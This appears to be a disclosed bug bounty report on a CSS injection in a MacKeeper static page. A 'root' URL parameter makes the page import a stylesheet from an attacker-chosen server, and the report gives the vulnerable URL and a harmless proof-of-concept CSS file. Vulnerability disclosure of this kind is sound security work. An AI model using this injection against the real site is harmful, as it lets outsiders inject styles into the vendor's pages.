# CSS Injection on static.mackeeper.com - Potential XSS

### SUMMARY BY CLARIO

### Summary
CSS injection vulnerabilities arise when an application imports a style sheet from a user-supplied URL, or embeds user input in CSS blocks without adequate escaping. They are closely related to cross-site scripting (XSS) vulnerabilities but often trickier to exploit.

### Steps to reproduce
the vulnerabile url is : 
`https://static.mackeeper.com/landings/libs/alert/alerts/exitpopup74/exit-popup.php?root=https://+YOUR SERVER+/&lang=en`
```html
<style>
    @import url("https://YOUR SERVER/alert/alerts/exitpopup74/css/exit-popup.css");
</style>
```

create a css file with name exit-popup.css on this path `/alert/alerts/exitpopup74/css/`
now edit the css file exit-popup.css with this css code:
```css
div {
 background-image: url("https://media.giphy.com/media/SggILpMXO7Xt6/giphy.gif");
 background-color: #cccccc;
}
```
now go to 
`https://static.mackeeper.com/landings/libs/alert/alerts/exitpopup74/exit-popup.php?root=https://+Your+Server+/&lang=en`
